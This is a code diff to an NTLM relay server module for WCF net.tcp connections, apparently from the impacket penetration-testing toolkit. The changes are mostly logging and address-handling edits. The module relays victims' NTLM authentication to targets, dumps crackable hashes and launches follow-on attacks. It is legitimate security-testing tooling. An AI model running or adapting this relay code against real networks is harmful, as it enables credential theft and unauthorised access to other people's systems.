@@ -43,6 +43,7 @@ from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.spnego import SPNEGO_NegTokenInit, ASN1_AID, SPNEGO_NegTokenResp, TypesMech, MechTypes, \
     ASN1_SUPPORTED_MECH
+from impacket.examples.utils import get_address
 
 
 class WCFRelayServer(Thread):
@@ -50,9 +51,9 @@ class WCFRelayServer(Thread):
         def __init__(self, server_address, request_handler_class, config):
             self.config = config
             self.daemon_threads = True
-            if self.config.ipv6:
-                self.address_family = socket.AF_INET6
+            self.address_family, server_address = get_address(server_address[0], server_address[1], self.config.ipv6)
             self.wpad_counters = {}
+            socketserver.TCPServer.allow_reuse_address = True
             socketserver.TCPServer.__init__(self, server_address, request_handler_class)
 
     class WCFHandler(socketserver.BaseRequestHandler):
@@ -71,9 +72,9 @@ class WCFRelayServer(Thread):
                 self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
             self.target = self.server.config.target.getTarget()
             if self.target is None:
-                LOG.info("WCF: Received connection from %s, but there are no more targets left!" % client_address[0])
+                LOG.info("(WCF): Received connection from %s, but there are no more targets left!" % client_address[0])
                 return
-            LOG.info("WCF: Received connection from %s, attacking target %s://%s" % (
+            LOG.info("(WCF): Received connection from %s, attacking target %s://%s" % (
                 client_address[0], self.target.scheme, self.target.netloc))
 
             socketserver.BaseRequestHandler.__init__(self, request, client_address, server)
@@ -91,55 +92,55 @@ class WCFRelayServer(Thread):
         def handle(self):
             version_code = self.recvall(1)
             if version_code != b'\x00':
-                LOG.error("WCF: wrong VersionRecord code")
+                LOG.error("(WCF): wrong VersionRecord code")
                 return
             version = self.recvall(2)  # should be \x01\x00 but we don't care
             if version != b'\x01\x00':
-                LOG.error("WCF: wrong VersionRecord version")
+                LOG.error("(WCF): wrong VersionRecord version")
                 return
 
             mode_code = self.recvall(1)
             if mode_code != b'\x01':
-                LOG.error("WCF: wrong ModeRecord code")
+                LOG.error("(WCF): wrong ModeRecord code")
                 return
             mode = self.recvall(1)  # we don't care
 
             via_code = self.recvall(1)
             if via_code != b'\x02':
-                LOG.error("WCF: wrong ViaRecord code")
+                LOG.error("(WCF): wrong ViaRecord code")
                 return
             via_len = self.recvall(1)
             via_len = struct.unpack("B", via_len)[0]
             via = self.recvall(via_len).decode("utf-8")
 
             if not via.startswith("net.tcp://"):
-                LOG.error("WCF: the Via URL '" + via + "' does not start with 'net.tcp://'. "
+                LOG.error("(WCF): the Via URL '" + via + "' does not start with 'net.tcp://'. "
                                                        "Only NetTcpBinding is currently supported!")
                 return
 
             known_encoding_code = self.recvall(1)
             if known_encoding_code != b'\x03':
-                LOG.error("WCF: wrong KnownEncodingRecord code")
+                LOG.error("(WCF): wrong KnownEncodingRecord code")
                 return
             encoding = self.recvall(1)  # we don't care
 
             upgrade_code = self.recvall(1)
             if upgrade_code != b'\x09':
-                LOG.error("WCF: wrong UpgradeRequestRecord code")
+                LOG.error("(WCF): wrong UpgradeRequestRecord code")
                 return
             upgrade_len = self.recvall(1)
             upgrade_len = struct.unpack("B", upgrade_len)[0]
             upgrade = self.recvall(upgrade_len).decode("utf-8")
 
             if upgrade != "application/negotiate":
-                LOG.error("WCF: upgrade '" + upgrade + "' is not 'application/negotiate'. Only Negotiate is supported!")
+                LOG.error("(WCF): upgrade '" + upgrade + "' is not 'application/negotiate'. Only Negotiate is supported!")
                 return
             self.request.sendall(b'\x0a')
 
             while True:
                 handshake_in_progress = self.recvall(5)
                 if not handshake_in_progress[0] == 0x16:
-                    LOG.error("WCF: Wrong handshake_in_progress message")
+                    LOG.error("(WCF): Wrong handshake_in_progress message")
                     return
 
                 securityBlob_len = struct.unpack(">H", handshake_in_progress[3:5])[0]
@@ -160,7 +161,7 @@ class WCFRelayServer(Thread):
                                 mechStr = MechTypes[mechType]
                             else:
                                 mechStr = hexlify(mechType)
-                            LOG.debug("Unsupported MechType '%s'" % mechStr)
+                            LOG.debug("(WCF): Unsupported MechType '%s'" % mechStr)
                             # We don't know the token, we answer back again saying
                             # we just support NTLM.
                             respToken = SPNEGO_NegTokenResp()
@@ -188,12 +189,12 @@ class WCFRelayServer(Thread):
                     break
 
             if not token.startswith(b"NTLMSSP\0\1"):  # NTLMSSP_NEGOTIATE: message type 1
-                LOG.error("WCF: Wrong NTLMSSP_NEGOTIATE message")
+                LOG.error("(WCF): Wrong NTLMSSP_NEGOTIATE message")
                 return
 
             if not self.do_ntlm_negotiate(token):
                 # Connection failed
-                LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target',
+                LOG.error('(WCF): Negotiating NTLM with %s://%s failed. Skipping to next target',
                           self.target.scheme, self.target.netloc)
                 self.server.config.target.registerTarget(self.target)
                 return
@@ -222,7 +223,7 @@ class WCFRelayServer(Thread):
                 error_len = struct.unpack(">H", handshake_done[3:5])[0]
                 error_msg = self.recvall(error_len)
                 hresult = hex(struct.unpack('>I', error_msg[4:8])[0])
-                LOG.error("WCF: Received handshake_error message: " + hresult)
+                LOG.error("(WCF): Received handshake_error message: " + hresult)
                 return
 
             ntlmssp_auth_len = struct.unpack(">H", handshake_done[3:5])[0]
@@ -234,7 +235,7 @@ class WCFRelayServer(Thread):
                 ntlmssp_auth = blob['ResponseToken']
 
             if not ntlmssp_auth.startswith(b"NTLMSSP\0\3"):  # NTLMSSP_AUTH: message type 3
-                LOG.error("WCF: Wrong NTLMSSP_AUTH message")
+                LOG.error("(WCF): Wrong NTLMSSP_AUTH message")
                 return
 
             authenticateMessage = ntlm.NTLMAuthChallengeResponse()
@@ -242,27 +243,27 @@ class WCFRelayServer(Thread):
 
             if not self.do_ntlm_auth(ntlmssp_auth, authenticateMessage):
                 if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                    LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
+                    LOG.error("(WCF): Authenticating against %s://%s as %s\\%s FAILED" % (
                         self.target.scheme, self.target.netloc,
                         authenticateMessage['domain_name'].decode('utf-16le'),
                         authenticateMessage['user_name'].decode('utf-16le')))
                 else:
-                    LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
+                    LOG.error("(WCF): Authenticating against %s://%s as %s\\%s FAILED" % (
                         self.target.scheme, self.target.netloc,
                         authenticateMessage['domain_name'].decode('ascii'),
                         authenticateMessage['user_name'].decode('ascii')))
                 return
 
             # Relay worked, do whatever we want here...
+            self.client.setClientId()
             if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
-                    self.target.scheme, self.target.netloc,
-                    authenticateMessage['domain_name'].decode('utf-16le'),
-                    authenticateMessage['user_name'].decode('utf-16le')))
+                LOG.info("(WCF): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % (
+                    authenticateMessage['domain_name'].decode('utf-16le'), authenticateMessage['user_name'].decode('utf-16le'),
+                    self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
             else:
-                LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
-                    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
-                    authenticateMessage['user_name'].decode('ascii')))
+                LOG.info("(WCF): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % (
+                    authenticateMessage['domain_name'].decode('ascii'), authenticateMessage['user_name'].decode('ascii'),
+                    self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
 
             ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                 authenticateMessage['user_name'],
@@ -271,7 +272,7 @@ class WCFRelayServer(Thread):
             self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
 
             if self.server.config.dumpHashes is True:
-                LOG.info(ntlm_hash_data['hash_string'])
+                LOG.info("(WCF): %s" % ntlm_hash_data['hash_string'])
 
             if self.server.config.outputFile is not None:
                 writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
@@ -302,7 +303,7 @@ class WCFRelayServer(Thread):
                 if self.challengeMessage is False:
                     return False
             else:
-                LOG.error('Protocol Client for %s not found!' % self.target.scheme.upper())
+                LOG.error('(WCF): Protocol Client for %s not found!' % self.target.scheme.upper())
                 return False
 
             return True
@@ -336,10 +337,12 @@ class WCFRelayServer(Thread):
                 # We have an attack.. go for it
                 clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config,
                                                                                       self.client.session,
-                                                                                      self.authUser)
+                                                                                      self.authUser,
+                                                                                      self.target,
+                                                                                      self.client)
                 clientThread.start()
             else:
-                LOG.error('No attack configured for %s' % self.target.scheme.upper())
+                LOG.error('(WCF): No attack configured for %s' % self.target.scheme.upper())
 
     def __init__(self, config):
         Thread.__init__(self)
